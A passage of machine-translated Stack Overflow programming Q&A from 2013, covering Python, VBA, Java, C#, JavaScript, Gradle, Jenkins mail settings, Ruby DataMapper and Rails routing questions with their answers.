In [3]: [list(group) for key, group in groupby(lst, lambda x: x!=',') if key]
Out[3]: [[['something', ',', 'eh']], [['more']], ['yet more', '|', 'even more']] 
```

它基本上根据标准 () 将列表中的项目分成组，`item != ','`并且理解检查`if k`过滤掉那些组`False` - 即等于的项目`','`。

```
In [4]: for key, group in groupby(lst, lambda x: x!=','):
   ...:     print key, list(group)
   ...:     
True [['something', ',', 'eh']]
False [',']
True [['more']]
False [',']
True ['yet more', '|', 'even more'] 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-19T21:29:09.717

派对迟到了，但 FWIW，我认为结合哨兵价值`itertools.takewhile`和`iter`与哨兵价值提供了一个快速的解决方案

```
from itertools import takewhile

z = [[ 'something', ',', 'eh' ], ',', ['more'], ',',
  'yet more', '|', 'even more' ]
z = iter(z)
def provider():
  return list(takewhile(lambda x: x != ',', z))

for i in iter(provider, []):
  print i

... 
[['something', ',', 'eh']]
[['more']]
['yet more', '|', 'even more'] 
```

# css - 社交引擎徽标图像大小更改

> ID：16110309
> 
> 赞同：0
> 
> 时间：2013-04-19T17:28:37.260
> 
> 标签：css, height, socialengine, graphical-logo

我正在尝试更改社交引擎网站的顶部图片。当我检查元素时，我可以在 Chrome 中执行此操作，但是当我尝试在控制面板的自定义 css 部分中更改它时，它不会进行更改。我正在尝试将最小高度从 40 更改为 70 像素。

这是代码和页面链接：

[http://phillyspecials.socialengine.com/](http://phillyspecials.socialengine.com/)

```
 #header #logo img {
      display: block;
      max-width: 300px;
      min-height: 70px;
 } 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-19T17:41:39.770

您发布的代码显示最大高度，将最大值更改为最小值，您应该会很好。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-19T18:09:39.947

我最终将 CSS 粘贴在模板下的标头 HTML 文件中，这完成了工作

# excel - 使用 If 宏查找具有特定文本的单元格

> ID：16110311
> 
> 赞同：3
> 
> 时间：2013-04-19T17:28:39.933
> 
> 标签：excel, vba

我有一张成本表，里面有很多宏。其中一个宏是在工作表底部添加一个新行项目。我想输入一个 If 代码，说明如果我添加的项目以文本“自定义”开头，并在我希望它找到该单元格并选择它之后带有空格。下面是我正在尝试的代码，但它使用类型不匹配进行调试并突出显示 Custom = Range("B:B").Value 行。任何帮助深表感谢。

```
 Dim Custom As String
    Custom = Range("B:B").Value
    If Custom Like "Custom *" Then
    Cells.Find(What:="Custom ", After:=ActiveCell, LookIn:=xlFormulas, _
        LookAt:=xlPart, SearchOrder:=xlByRows, SearchDirection:=xlNext, _
        MatchCase:=True, SearchFormat:=False).Activate
    ActiveCell.FormulaR1C1 = ("Test")
    End If 
```

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2013-04-19T17:41:37.457

您不需要为此使用`LIKE`。直接使用`.Find`看这个例子

注意使用`LookAt:=xlPart`. 这将确保如果`"Custom "`单元格内容中有任何地方，代码将捕获它。

```
Sub Sample()
    Dim ws As Worksheet
    Dim aCell As Range

    Set ws = ThisWorkbook.Sheets("Sheet1")

    With ws
        Set aCell = .Columns(2).Find(What:="Custom ", LookIn:=xlValues, _
                    LookAt:=xlPart, SearchOrder:=xlByRows, SearchDirection:=xlNext, _
                    MatchCase:=False, SearchFormat:=False)
        If Not aCell Is Nothing Then
            aCell.Value = "Test"
        Else
            MsgBox "Not Found"
        End If
    End With
End Sub 
```

# java - Java 后端和 iOS 客户端 - RESTful

> ID：16110314
> 
> 赞同：2
> 
> 时间：2013-04-19T17:28:54.470
> 
> 标签：java, ios, api, rest, backend

我正在尝试开发一个客户端-服务器分布式系统。客户端将在 iOS 中运行，而我想使用 java 作为后端部分。

我想写一些 API，因为我在移动环境中，我无法预测有多少客户会询问我的服务，你建议什么样的 BaaS？

不需要保持与 TCP 的开放连接，我想避免无用的电池浪费。我需要使用 SSL 进行一些 API 调用并使用 HTTP 1.1 层，而不是 TCP 会帮助我很多。我想使用 JSON 作为输出。

我可以使用现成的框架（java-iOS）来实现这个目标，或者你可以建议的库吗？您将如何设置所有内容以便在 iOS 端拥有心跳机制（这样我就可以跟踪所有客户端服务器端）并适当地回答。服务器端什么是最合适的 JBoss 或 Glassfish？我听说过反应器模式，有什么可以从java开始的吗？

我真的很感谢你！

问候

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-19T18:45:48.210

It is quite easy to implement a RESTful API in java. There is a specification for that - `jax-rs`. There are several libraries that implement it - Jersey is the reference implementation, but there are others as well. For server - I would go for Tomcat or Jetty. Unless you use EJBs (which I don't think you really want to), there is no reason to use an application server like Glassfish or JBoss.

# vba - 日期对象的设置属性的VBA编译错误

> ID：16110315
> 
> 赞同：3
> 
> 时间：2013-04-19T17:28:55.413
> 
> 标签：vba, compiler-errors

我对 VBA 代码相当陌生，当我尝试在我创建的类中运行此代码时遇到编译错误。

```
Private pWorkDate As Date

Public Property Set WorkDate(value As Date)
Set pWorkDate = value
End Property

Public Property Get WorkDate() As Date
Set WorkDate = pWorkDate
End Property 
```

这是我收到的错误消息：

> 同一属性的属性过程定义不一致，或属性过程有可选参数、ParamArray 或无效的 Set final 参数

请原谅我的无知，但我一直在四处寻找，似乎无法找到我做错了什么。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-04-19T17:34:48.583

它不喜欢您尝试使用`set`which 用于对象引用，类型变量`Date`永远不可能是（它的原始类型（如`integer`）而不是对象类型（如您的类））。

更改为`Let`&不要使用`Set`：

```
Public Property Let WorkDate(value As Date)
   pWorkDate = value
End Property

Public Property Get WorkDate() As Date
   WorkDate = pWorkDate
End Property 
```

# java - 如何使用 JLayer 停止声音

> ID：16110316
> 
> 赞同：0
> 
> 时间：2013-04-19T17:29:01.810
> 
> 标签：java, audio, jlayer

我正在使用 JLayer 在我的游戏中播放 mp3 文件，但我无法停止这首歌。那是我的代码：

```
public void play(final String sonido) {

    reproduciendo.put(sonido, 1);
    Thread thread = new Thread() {
        public void run() {
            while(reproduciendo.get(sonido)!=null) {
            try {
            Player player = new Player(getSonido(sonido));
            player.play();
            if(player.isComplete()) reproduciendo.remove(sonido);
            } catch(Exception e) {e.printStackTrace();};
        }}
    };

    thread.start();

}

public void stop (String sonido ) {
    reproduciendo.remove(sonido);
} 
```

当我使用 stop 方法删除哈希图“reproduciendo”的歌曲时，它应该停止，但什么也没做，我在这里读过这种方式，但它对我不起作用。你知道另一种方法吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-05-24T15:45:59.500

查看我对其他类似问题的回答，只需播放一个音频帧并检查一个标志是否应该暂停或停止播放

[https://stackoverflow.com/a/16738486/2094045](https://stackoverflow.com/a/16738486/2094045)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-19T17:32:53.343

我不知道你使用的是什么库，但也许你可以在你的播放器类中找到一个“停止”方法。

# c# - 无法在 Windows 7 上读取 64 位注册表项

> ID：16110320
> 
> 赞同：2
> 
> 时间：2013-04-19T17:29:14.753
> 
> 标签：c#, windows, registry, uac

我在尝试读取注册表项但失败的以下代码中遇到问题。具体错误是：“ *System.NullReferenceException：对象引用未设置为对象的实例*。” 我正在使用的代码如下：

```
using System;
using System.Collections.Generic;
using System.Text;
using Microsoft.Win32;
using System.Collections;
using System.Diagnostics;
using System.Security.Principal;

namespace UDTLibrary
{
    public class NotificationBar
    {
        public static void Main(string[] args)
        {
            //Get User Info
            string sSource;
            string sLog;

            sSource = "TestCSFileSysWatcher";
            sLog = "Application";

            if (!EventLog.SourceExists(sSource))
                EventLog.CreateEventSource(sSource, sLog);

            EventLog.WriteEntry(sSource, "NotificationBar.Main start");

            WindowsIdentity identity = WindowsIdentity.GetCurrent();
            WindowsPrincipal principal = new WindowsPrincipal(identity);
            if (!principal.IsInRole(WindowsBuiltInRole.Administrator))
            {
                EventLog.WriteEntry(sSource, "NotificationBar.Main - non-Administrator");
            }
            else
            {
                EventLog.WriteEntry(sSource, "NotificationBar.Main Administrator");
            }

            NotificationBar p1 = new NotificationBar();
            string prName = null;
            int value = 0;
            if (args == null)
            {
                throw new Exception("Attempt to run NotificationBar with no arguments supplied.");
            }
            else
            {
                if (args.Length != 2)
                {
                    throw new Exception("Wrong number of arguments supplied.");
                }
                else
                {
                    prName = args[0];
                    value = Convert.ToInt32(args[1]);
                }
            }

            RegistryKey currentUser = null;
            if (Environment.Is64BitOperatingSystem)
            {
                currentUser = RegistryKey.OpenBaseKey(Microsoft.Win32.RegistryHive.CurrentUser, RegistryView.Registry64);
            }
            else
            {
                currentUser = RegistryKey.OpenBaseKey(Microsoft.Win32.RegistryHive.CurrentUser, RegistryView.Registry32);
            }
            RegistryKey myKey = currentUser.OpenSubKey(@"Software\Classes\Local Settings\Software\Microsoft\Windows\CurrentVersion\TrayNotify", true);
            byte[] all = (byte[])myKey.GetValue("IconStreams"); //here is where the code fails
            byte[] allwithoutheader = new byte[all.Length - 20];
            byte[] header = new byte[20]; 
```

关于我的环境的一些事实：

*   这是我在 Windows 7 上运行的 32 位应用程序（启用了 UAC - 不，我无法将其关闭）。但是，我正在从注册表的 64 位视图中读取（如上面的代码所示 - 我已确认正在选择 RegistryView.Registry64）
*   该代码以管理权限运行。我已经通过上面检查 WindowsBuiltInRole.Administrator 的代码确认了这一点 - 日志写入“管理员”行而不是“非管理员”行
*   我尝试更改代码以读取字符串而不是字节，并尝试从不同的位置（在 HKLM 而不是 HKCU）读取但没有成功。

我在这里遗漏了一些明显的东西吗？您可以提供的任何建议将不胜感激。如果您还有其他需要解决的问题，请告诉我。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-23T08:29:56.393

如果您试图打开一个密钥并且没有这样的密钥，您将获得空值。尝试像这样重新创建密钥：

```
if (mykey == null)
{
   key = Microsoft.Win32.Registry.CurrentUser.CreateSubKey(@"CurrentVersion\TrayNotify");
} 
```

***现在使用regedit***命令进入注册表并找到您的子键“CurrentVersion\TrayNotify”，您将看到您创建的内容与您正在寻找的内容之间的区别..

如果您想检查当前用户，请运行命令行，然后输入

```
 echo %username% 
```

# javascript - 如何将我自己的 js 库选择器更改为 jquery 选择器 $()

> ID：16110322
> 
> 赞同：2
> 
> 时间：2013-04-19T17:29:24.743
> 
> 标签：javascript

我创建了一个简单的 javascript 库，我想查询一些事情为了做我做。

首先：这是 **我的 JS 库中代码的一部分**

```
(function() {
    var lib = {
        elems: [],
        getElem: function() {
            var tmpElem = [];
            for (var i = 0; i < arguments.length; i++)
                tmpElem.push(document.getElementById(arguments[i]));
            this.elems = tmpElem;
            tmpElem = null;
            return this;
        },
        html: function(txt) {
            for (var i = 0; i < this.elems.length; i++)
                this.elems[i].innerHTML = txt;
            return this;
        },
        style: function(prob, val) {
            for (var i = 0; i < this.elems.length; i++)
                this.elems[i].style[prob] = val;
            return this;
        },
        addEvent: function(event, callback) {
            if (this.elems[0].addEventListener) {
                for (var i = 0; i < this.elems.length; i++)
                    this.elems[i].addEventListener(event, callback, false);
            } else if (this.elems[0].attachEvent) {
                for (var i = 0; i < this.elems.length; i++)
                    this.elems[i].attachEvent('on' + event, callback);
            }
            return this;
        },
        toggle: function() {
            for (var i = 0; i < this.elems.length; i++)
                this.elems[i].style.display = (this.elems[i].style.display === 'none' || '') ? 'block' : 'none';
            return this;
        },
        domLoad: function(callback) {
            var isLoaded = false;
            var checkLoaded = setInterval(function() {
                if (document.body && document.getElementById)
                    isLoaded = true;
            }, 10);
            var Loaded = setInterval(function() {
                if (isLoaded) {
                    clearInterval(checkLoaded);
                    clearInterval(Loaded);
                    callback();
                }
            }, 10);
        }
    };

    var fn = lib.getElem;
    for(var i in lib)
        fn[i] = lib[i];

    window.lib = window.$ = fn;
})(); 
```

现在我们将继续......

正如我们在 jquery 中所知道的，当指向一个指定的元素时，我们像这样使用

```
$('#id').show // or
$(document).ready  // and so on 
```

和我的图书馆以这种方式使用。

```
$.getElem('id') 
```

现在我该如何更改这部分`$.getElem('id')`才能`$()`像在 jquery 中一样。

> /////////////////////////////////////////////////////////////////////////////////// **_** _ ///

应用`@Peter Olson`答案后，向我显示一条错误消息`TypeError: $(...).html is not a function`。

此错误消息的原因是什么？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-19T17:37:38.280

您需要创建`$`一个函数，然后为其添加属性。

```
(function() {
    var lib = {
        // ...
    };
    var fn = lib.getElem;
    for(var i in lib) {
      fn[i] = lib[i];
    }
    window.lib = window.$ = fn;
})(); 
```

# excel - 快速 Excel 图表参考更改

> ID：16110323
> 
> 赞同：0
> 
> 时间：2013-04-19T17:29:24.753
> 
> 标签：excel, excel-2010, vba

嗨，我是新站点，我希望是一个我无法弄清楚的简单解决方案。

我有一个工作簿，其中有 10 个相同的选项卡，每个选项卡都有不同的数据。我创建了一个新选项卡，它引用选项卡 1 来绘制我拥有的各种数据。我正在查看大约 20 个图表，现​​在我想对剩余的 9 个选项卡进行相同的图形分析，同时创建 9 个新选项卡。

我似乎可以这样做的唯一方法是复制图表，然后更改每个图表中的数据源，这需要几个小时。有什么我遗漏的东西，还是有一个宏可以让这变得更容易？

非常感谢您的回答。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-20T05:03:23.060

我以前不得不搞乱动态添加图表。这是一个稍微修改过的片段，你可以弄乱。为简单起见，假设您的范围是当前工作表的 A1:B20。

```
Sub AddChart()
Dim ws as worksheet
For each ws in ThisWorkbook.Sheets
        'ADD CHART. . .
        ws.Shapes.AddChart.Select
        ActiveChart.SetSourceData Source:=ws.Range("A1:B20")

        'this makes the chart a certain size, fitted to a cell range.
        Dim RngToCover As Range
        Dim ChtOb As ChartObject
        Set RngToCover = ws.Range("c4:f8") 'chart will be the size of c4:f8
        Set ChtOb = ActiveChart.Parent
        ChtOb.Height = RngToCover.Height ' resize
        ChtOb.Width = RngToCover.Width ' resize
        ChtOb.Top = RngToCover.Top ' reposition
        ChtOb.Left = RngToCover.Left ' reposition

    'random other stuff I did with labels etc.
    ws.Unprotect
        ActiveChart.HasLegend = False
        ActiveChart.ChartTitle.Text = "Age Statistics"
        ActiveChart.SeriesCollection(1).ApplyDataLabels
    ws.Protect DrawingObjects:=False, Contents:=True, Scenarios:= _
            False, AllowSorting:=True

  'go to next worksheet
Next ws 
```

# multithreading - MonoTouch，如何判断我是否在 UI 线程上

> ID：16110326
> 
> 赞同：2
> 
> 时间：2013-04-19T17:29:47.843
> 
> 标签：multithreading, xamarin.ios, ui-thread

标题说明了一切。

我有一个通用函数，用于在 UI 线程上运行操作。如果我已经在 UI 线程上，我想简单地调用该操作。

有没有办法用 MonoTouch 做到这一点？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-19T17:36:17.573

是的`NSThread.IsMain`。

看到[这个帖子](https://stackoverflow.com/questions/3962415/detecting-when-youre-in-out-of-the-main-thread-in-monotouch)。

# sockets - Ruby 中的 TCPServer.new(port) 和 TCPServer.open("XXXX", port) 有什么区别？

> ID：16110327
> 
> 赞同：3
> 
> 时间：2013-04-19T17:29:49.510
> 
> 标签：sockets, server-side, ruby-1.9.3, tcpserver

我已经阅读了 Ruby 文档，但我并没有真正理解这两个对象之间的区别。

TCPServer.new(port) 和 TCPServer.open("XXXX", 端口)

我所知道的是 .new 仅响应客户端（并且仅响应同一台计算机上的客户端）尝试连接到 IP 的“localhost”。当客户端尝试连接到 127.0.0.0 时，它甚至不起作用，这应该与“localhost”相同。但是 .open 让我允许来自我计算机外部的人进行连接。正如您在上面看到的，我从未向 .new 提供 IP，而只向 .open 提供 IP。我只是想了解这两个一般是如何工作的，所以任何信息都会有所帮助！谢谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2016-04-21T20:40:11.410

他们是一样的。在 Programming Ruby 1.9 中，它说：

```
open: Synonym for TCPServer.new 
```

# jquery - 表格内的目标复选框

> ID：16110328
> 
> 赞同：3
> 
> 时间：2013-04-19T17:29:56.080
> 
> 标签：jquery, html

我有一个包含一行和三列的表格，在第三列我有一个复选框，如果有更改，我想做出反应：

```
<table id="tabla_busqueda">
   <tr>
     <td>Data 1</td>
     <td>Data 2</td>
     <td><input type="checkbox" class="check_nuevo"></td>
   </tr>
</table> 
```

我努力了：

```
$('table tr td input.check_nuevo').on('change', function(){
    alert('hello');
});

$('table#tabla_busqueda .check_nuevo').on('change', function(){}
$('table td .check_nuevo').on('change', function(){} 
```

和其他一些，但似乎没有任何效果。我究竟做错了什么？关于如何定位该复选框的任何建议？

这是生成我的表的 php 代码

```
foreach ($datos as $row) {
                $clase = ($fila % 2 == 0) ? 'even' : 'odd';
                $resultado .=   '<tr class="'. $clase .'"> 
                                    <td class="imagen_chica" ><img src="' . base_url() . 'product_images_mini/' . $row->image_path . '"></td>
                                    <td>' . $row->titulo . '<em> de </em>' . $row->nombre_autor . '</td>
                                    <td><input type="checkbox" class="check_nuevo"></td>
                                </tr>'; 
                                $fila++;    
                } 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-19T18:05:02.860

我猜当您绑定更改处理程序时，内容还不存在。像这样的东西应该工作：

```
$(document).on('change', 'table tr td input.check_nuevo', function() {
    alert("Is this working now?");
}); 
```

* * *

## 回答 #2

> 赞同：-2
> 
> 时间：2013-04-19T17:33:36.950

使用“绑定”而不是“开”：

```
$('table tr td input.check_nuevo').bind('change', function(){
    alert('hello');
}); 
```

检查这个jsfiddle了：http: [//jsfiddle.net/5cJjh/](http://jsfiddle.net/5cJjh/)

# properties - 在 Gradle 构建脚本中使用系统属性

> ID：16110330
> 
> 赞同：4
> 
> 时间：2013-04-19T17:30:07.730
> 
> 标签：properties, gradle

这应该是最简单的问题，但我在从 Gradle 测试任务访问系统变量时遇到问题。[我所做](https://github.com/djangofan/GradleProps)的事情一定有错字，因为我确信这种语法是正确的，但它不起作用。我希望有人可以帮助我确定下面这段代码片段的问题？

```
// my gradle build says the following line is a deprecated method    
//systemProperties = System.getProperties()

// this line always returns 1 on a multiprocessor system
println 'NUMBER_OF_PROCESSORS is ' +
     System.getProperty( "NUMBER_OF_PROCESSORS", "1" )

// this line also always returns the default for TMP var
println 'TMP is ' + System.getProperty( "TMP", "C:\\Temp" ) 
```

注意：我也在[这里问过这个问题，](http://forums.gradle.org/gradle/topics/how_should_i_be_handling_passing_system_properties_from_gradle_to_my_tests)但由于它是一个封闭的线程，我不确定我是否会在那里得到答案。另外，我已经彻底[阅读了文档](http://www.gradle.org/docs/current/userguide/tutorial_this_and_that.html)，但没有帮助。

我尝试了这些，但它们也失败了：

```
test {
    println ""
    ENV = System.getProperties()
    println "TMP is " + ENV['TMP']
    println ""
}

task testa(Type:Test) { 
    println ""
    println "HOMEPATH = " + System.getProperty( "HOMEPATH", "defaultpath" )
    println "TMP = " + System.getProperty( "TMP", "defaulttmp" )
    println ""
}

task testb(Type:Test) {
    println ""
    println "HOMEPATH = " + System.properties['HOMEPATH']
    println "TMP = " + System.properties['TMP']
    println ""
}

task testc(Type:Test) {
    // pass a arg to this test like -PMYARG=anything
    println ""
    println "Parg = " + System.properties['MYARG']
    println ""
}

testWorks {
    println ""
    ENV['ok'] = "good to go"
    println "this test is " + ENV['ok']
    println ""
} 
```

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2013-04-20T00:25:10.413

要使 Gradle JVM 的系统属性可用于测试，您可以执行以下操作：

```
test {
    systemProperties = System.properties
} 
```

或者，如果您声明了其他`Test`任务：

```
tasks.withType(Test) {
    systemProperties = System.properties
} 
```

# algorithm - 使用什么算法来选择具有良好出现计数但分布值的密钥？

> ID：16110344
> 
> 赞同：2
> 
> 时间：2013-04-19T17:31:08.640
> 
> 标签：algorithm, distribution

我有 2 套`A`和`B`.

存在一个将元素映射`A`到的表`B`。唯一需要注意的是一对（表中的行）可以出现不止一次。

`A`目标是按照条件定义的顺序对元素进行排序：

1.  在`A`表中出现次数较多的元素是一个很好的元素。
2.  与相同元素多次`A`配对的元素不好。`B`

以上当然是定性的，我计划在测试算法时制作一个正确的定量版本（通过多少`1`或`2`影响一个好元素的概念）。

您能否建议我应该查看哪些算法和数据结构（如果已经存在的话）？

**编辑：**一般来说，如果决定哪个元素在哪个之前，取决于两个几乎不是线性的因素，它是如何写的？

在我的例子中，一个元素`A`几乎与`B`它出现的任何地方的相同元素完全配对，是一个非常“少”的元素。即使它的出现次数很多，它也会出现在其他所有事情之后。

我不知何故觉得这很令人困惑，并想知道是否有一些资源/研究可以处理这类事情。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-19T19:13:20.797

您可以创建一个本质上是：

```
struct
{
    Element  // 'A', for example
    Count    // total number of 'A' elements
    HashMap(Element, count) // A hash map keyed by element ('B', for example),
                            // count is the number of times A is paired with B
    Value   // computed "quality", based on your criteria
} 
```

如果您浏览映射表并构建这些结构的列表，则您可以计算每个元素的数量，以及每个元素与其他元素配对的次数。

然后，您可以使用您的标准来确定每个元素的值，最后按该值排序。

如何计算价值是一个悬而未决的问题。一个好的起点是将值相加 1/sqrt(count)。下表显示了元素 A 与元素 B、C 和 D 配对的次数，以及每次配对的结果值：

```
A  B   1   1/sqrt(1)  = 1/1
A  C   4   1/sqrt(4)  = 1/2
A  D  16   1/sqrt(16) = 1/4 
```

所以 A 的总分是 1 + 0.5 + 0.25，或 1.75

您必须使用公式来满足您的需求。我发现，除以计数太受欢迎了（即 AD 会给出 1/16）。除以平方根有助于最大限度地减少过度活跃的项目，但不能完全打折。

# java - 我得到 java.net.SocketException: Permission denied: 在 Jenkins 中发送电子邮件时连接

> ID：16110345
> 
> 赞同：8
> 
> 时间：2013-04-19T17:31:10.237
> 
> 标签：java, windows-7, jenkins

我的配置：

*   Windows 7 机器
*   爪哇 7
*   Jenkins 1.511 在本地帐户上作为服务运行

我的 jenkins.xml 文件

```
<service>
  <id>jenkins</id>
  <name>Jenkins</name>
  <env name="JENKINS_HOME" value="%BASE%"/>
  <executable>C:\Program Files\IBM\SDP8.5\jdk\bin\java.exe</executable>
  <arguments>-Xrs -Xmx256m -Dhudson.lifecycle=hudson.lifecycle.WindowsServiceLifecycle -jar "%BASE%\jenkins.war" --httpPort=8080 -Djava.net.preferIPv4Stack=true</arguments>
</service> 
```

我的 hudson.tasks.Mailer.xml 文件

```
<hudson.tasks.Mailer_-DescriptorImpl plugin="mailer@1.4">
  <defaultSuffix>@example.com</defaultSuffix>
  <hudsonUrl>http://localhost:8081/</hudsonUrl>
  <adminAddress>Jenkins Build Server &lt;do-not-reply@example.com&gt;</adminAddress>
  <smtpHost>smtp.example.com</smtpHost>
  <useSsl>false</useSsl>
  <charset>UTF-8</charset>
</hudson.tasks.Mailer_-DescriptorImpl> 
```

注意：“example.com”替换了我的真实域/电子邮件/smtp 服务器。

当我指示 Jenkins 发送测试电子邮件时，我收到此错误：

```
Failed to send out e-mail

javax.mail.MessagingException: Could not connect to SMTP host: smtp.example.com, port: 25;
nested exception is:
java.net.SocketException: Permission denied: connect

at com.sun.mail.smtp.SMTPTransport.openServer(SMTPTransport.java:1934)

at com.sun.mail.smtp.SMTPTransport.protocolConnect(SMTPTransport.java:638)

at javax.mail.Service.connect(Service.java:295) 
```

我对这个错误的理解是，Java 7 暴露了 Windows 中的一个错误，涉及防火墙以及 Java 7 如何使用 ipv4 映射的 ipv6 地址。

据报道，这可以通过在 java 运行时添加 -Djava.net.preferIPv4Stack=true 来解决。我已经成功地使用 ANT 电子邮件任务在这台机器上添加了 -Djava.net.preferIPv4Stack=true。但是，在詹金斯，我没有任何运气。

请注意，jenkins.xml 文件似乎被完全忽略了。-Djava.net.preferIPv4Stack=true 参数未设置。PATH 和 JAVA_HOME 都指向 IBM 运行时，但 Jenkins 仍然从 Oracle v7 运行时开始。Jenkins 必须产生一个新进程来启动和启动系统 java 7。

使用上述配置，如果我转到 Jenkins 脚本控制台并使用“System.getProperty("java.net.preferIPv4Stack") 询问它，我什么也得不到（未设置）。如果我设置了该参数，我仍然会收到错误消息。如果我将 -Djava.net.preferIPv4Stack=true 添加到命令行（不使用该服务），则在通过脚本控制台询问时仍未设置。

我的问题

1.  为什么我会收到此错误以及如何解决？请记住，我可以编写一个使用相同的 smtp 服务器和 java 运行时间成功发送电子邮件的 ANT 脚本。

2.  如何让 Jenkins 使用 -Djava.net.preferIPv4Stack=true 参数和指定的运行时间启动？

一些注意事项：

*   由于蹩脚的公司问题，我无法卸载 Java 7。
*   由于同样的问题，我无法安装 Java 6。
*   我被允许安装 IBM JDK/JRE。

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2013-04-20T05:21:01.480

参数后面的`-jar`参数将传递给应用程序，而不是 java vm。所以尝试 在争论`-Djava.net.preferIPv4Stack=true`之前 移动。`-jar`

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2015-01-15T23:12:30.967

> 2.如何让Jenkins以-Djava.net.preferIPv4Stack=true参数和指定的运行时间启动？

我不确定 Java 运行时，但这是对我有用的参数：“-Djava.net.preferIPv4Stack=true”。

1) 记事本“C:\Program Files (x86)\Jenkins\jenkins.xml”

2）找到类似的行：

```
<arguments>-Xrs -Xmx256m -Dhudson.lifecycle=hudson.lifecycle.WindowsServiceLifecycle -jar "%BASE%\jenkins.war" --httpPort=8080 -Djava.net.preferIPv4Stack=true</arguments> 
```

3) 将“-Djava.net.preferIPv4Stack=true”部分移到-jar 参数*之前。*它现在应该类似于：

```
<arguments>-Xrs -Xmx256m -Dhudson.lifecycle=hudson.lifecycle.WindowsServiceLifecycle -Djava.net.preferIPv4Stack=true -jar "%BASE%\jenkins.war" --httpPort=8080</arguments> 
```

4) 保存文件，退出记事本。

5）重启jenkins服务

6) 从“Manage Jenkins -> Configure System”网页发送测试邮件。电子邮件现在应该可以工作了。

# ruby - 覆盖 DataMapper 方法时的无限递归

> ID：16110351
> 
> 赞同：0
> 
> 时间：2013-04-19T17:31:35.590
> 
> 标签：ruby, datamapper, ruby-datamapper

我正在尝试覆盖我拥有的 DataMapper 模型中的`all()`and`first()`方法，但是存在一些问题。我的方法被调用了，但是（很明显）它们递归地调用自己并导致 SystemStackError。

```
class Model
  include DataMapper::Resource
  include OtherModule

  def self.all(options = {})
    do_something()
    self.all(options.merge!(:deleted => false))
  end

  def self.first(options = {})
    self.first(options.merge!(:deleted => false))
  end

  property :id,           Serial
  property :name,         Text
  ... 
```

除非另有说明，否则所有这些方法都应该调用`all`or`first`方法。`:deleted => false`

我试过了

```
 def self.all(options = {})
    super.self.all(options.merge!(:deleted => false))
  end 
```

和

```
 def self.all(options = {})
    do_something()
    super.all(options.merge!(:deleted => false))
  end 
```

无济于事。有没有办法解决这个无限递归问题？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-19T17:41:22.350

你在滥用超级

```
def self.all(options={})
    do_something()
    super(options.merge!(:deleted => false))
 end 
```

# algorithm - 具有大量行的相似文本

> ID：16110358
> 
> 赞同：1
> 
> 时间：2013-04-19T17:32:40.577
> 
> 标签：algorithm, full-text-search

我目前正在使用 PHP 的similar_text 函数，我有一个大约 1000 个节点的链表，每个节点有 5-200 个字符。

我现在正在做的是检查每一个并使用similar_text并根据百分比决定下一步做什么。

我确定添加新节点后此过程会受到影响。

是否有任何已知的方法或算法我应该遵循比上述更好的方法？

# ios - 以不同的名称发布 iOS 应用程序

> ID：16110359
> 
> 赞同：1
> 
> 时间：2013-04-19T17:32:42.963
> 
> 标签：ios, app-store

我们为 iOS 创建了一个应用程序，现在我们要发布这个应用程序。我们想用不同的名字发表，我们不想用我的名字或我的大学的名字。

在此过程中，我可以指定将出现在苹果商店应用程序下的应用程序下的名称吗？

我读了这个帖子：[iOS 应用发布 - 以不同的作者姓名发布](https://stackoverflow.com/questions/7796673/ios-app-publishing-publishing-under-different-author-name)

有什么变化吗？还是我们不能发布？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-19T18:13:17.543

不，没有任何变化。

听起来您还没有发布您的应用程序，如果是这种情况，您可以创建第二个 Apple ID，以新名称创建第二个开发者帐户并毫无问题地发布它。这显然会花费另一个开发者帐户。我有 3 个帐户，一个是个人帐户，两个是工作帐户，没有问题。

如果您已经发布了应用程序，您可以更改开发者帐户上的名称。我也做过这个。大约花了一个月的时间才完全完成。

# javascript - 页面加载时自动点击移动设备

> ID：16110364
> 
> 赞同：0
> 
> 时间：2013-04-19T17:32:58.053
> 
> 标签：javascript, jquery, ajax, jquery-mobile

我正在使用下面的代码在页面加载时自动单击一个 id。它适用于桌面，但不适用于移动设备。如何在手机上自动“点击”id？

```
<div id="media"></div>    

$(document).ready(function(){

  $('#media').click(function() {
    alert('tap!');
  });   

  $('#media').trigger('click');

}); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-19T17:45:30.977

您应该使用[vclick()](http://api.jquerymobile.com/vclick/)来虚拟化单击事件（仅在使用 jQueryMobile 时）。

# ruby-on-rails - Rails多个嵌套资源编辑链接不添加主要资源

> ID：16110366
> 
> 赞同：0
> 
> 时间：2013-04-19T17:33:00.947
> 
> 标签：ruby-on-rails, ruby, ruby-on-rails-3, polymorphic-associations, nested-resources

我正在使用多个嵌套资源，如下所示：

```
 resources :users do
    resources :clients do
      resources :positions
    end
  end

  resources :clients
  resources :positions 
```

一切都在我的模型和控制器中正常工作和设置，但我似乎无法弄清楚为什么这个编辑位置链接没有将用户添加到方法名称中。

```
<%= link_to 'Edit Position', edit_polymorphic_path([@user, @client, @position]) %> 
```

只输出这个：`edit_client_position_path`

而不是这个：`edit_user_client_position_path`

好像`:user_id`没有考虑到，但是如果我在`http://127.0.0.1:3000/users/1/clients/1/positions/1`页面加载成功时从显示页面中删除了编辑链接。非常感谢任何见解！

* * *

**更新**

我设法让链接*几乎*按照我之前想要的方式工作。我修改了我的路由文件，如下所示：

```
 resources :users do
    resources :clients do
      resources :positions
    end
  end

  resources :clients do
    resources :positions
  end

  resources :clients
  resources :positions 
